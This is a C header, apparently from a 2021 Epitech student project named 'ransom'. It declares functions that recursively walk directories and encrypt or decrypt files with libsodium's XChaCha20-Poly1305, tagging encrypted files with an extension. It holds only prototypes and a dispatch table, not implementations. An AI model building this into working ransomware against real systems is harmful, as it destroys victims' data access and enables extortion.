/*
** EPITECH PROJECT, 2021
** RANSOM_H_
** File description:
** ransom
*/


#ifndef RANSOM_H_
#define RANSOM_H_

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <sodium.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>
#include <pwd.h>
#include <stdbool.h>
#include <sodium.h>
#include <sodium/crypto_pwhash.h>
#include <sodium/crypto_secretstream_xchacha20poly1305.h>
#include <sodium/utils.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define MAX_FILEPATH 256
#define MAX_KEY_LEN crypto_secretstream_xchacha20poly1305_KEYBYTES
#define SALT_LEN crypto_pwhash_SALTBYTES
#define CHUNK_SIZE 4096
#define ENCRYPT (0)
#define DECRYPT (1)

typedef struct cryptalgo_s cryptalgo_t;
struct cryptalgo_s {
    void (*format_filename)(const char *filename, char *new_filename);
    bool (*skip_paths)(const char *path);
    bool (*init_cryptalgo)(FILE **f1, FILE **f2, const char *oldfilename, const char *new_filename);
    int (*manage_header)(unsigned char *generated_key, FILE **f1, FILE **f2,
        crypto_secretstream_xchacha20poly1305_state *st);
    int (*loop)(FILE *f1, FILE *f2, crypto_secretstream_xchacha20poly1305_state st);
};

// algo.c
int core(const char *password,
    const char *filepath, const char *optfilepath, cryptalgo_t algo);
int graceful_exit(FILE *f1, FILE *f2, unsigned char *generated_key, int ret);

// encryption.c
bool init_encryption(FILE **to_encrypt, FILE **encrypted,
    const char *filepath, const char *optfilepath);
int write_header(unsigned char *generated_key, FILE **to_encrypt,
    FILE **encrypted, crypto_secretstream_xchacha20poly1305_state *st);
int encryption_loop(FILE *to_encrypt, FILE *encrypted,
    crypto_secretstream_xchacha20poly1305_state st);

// decryption.c
bool init_decryption(FILE **to_decrypt, FILE **decrypted,
    const char *filepath, const char *optfilepath);
int read_header(unsigned char *generated_key,
    FILE **to_decrypt, FILE **decrypted, crypto_secretstream_xchacha20poly1305_state *st);
int decryption_loop(FILE *to_decrypt, FILE *decrypted,
    crypto_secretstream_xchacha20poly1305_state st);


// ransom.c
bool skip_already_decrypted(const char *path);
bool skip_already_encrypted(const char *path);
int iter_recursively_through_files(char *path, char *password,
    cryptalgo_t);
void get_new_path_name(char *parentPath, char *finalPath, char *currentPath);
void add_file_extension(const char *fileName, char *optFileName);
void remove_file_extension(const char *filename, char *optfilename);


static const cryptalgo_t cryptalgo[] = {
    [ENCRYPT] = {
        add_file_extension,
        skip_already_encrypted,
        init_encryption,
        write_header,
        encryption_loop
    },
    [DECRYPT] = {
        remove_file_extension,
        skip_already_decrypted,
        init_decryption,
        read_header,
        decryption_loop
    },
};


#endif /* RANSOM_H_ */
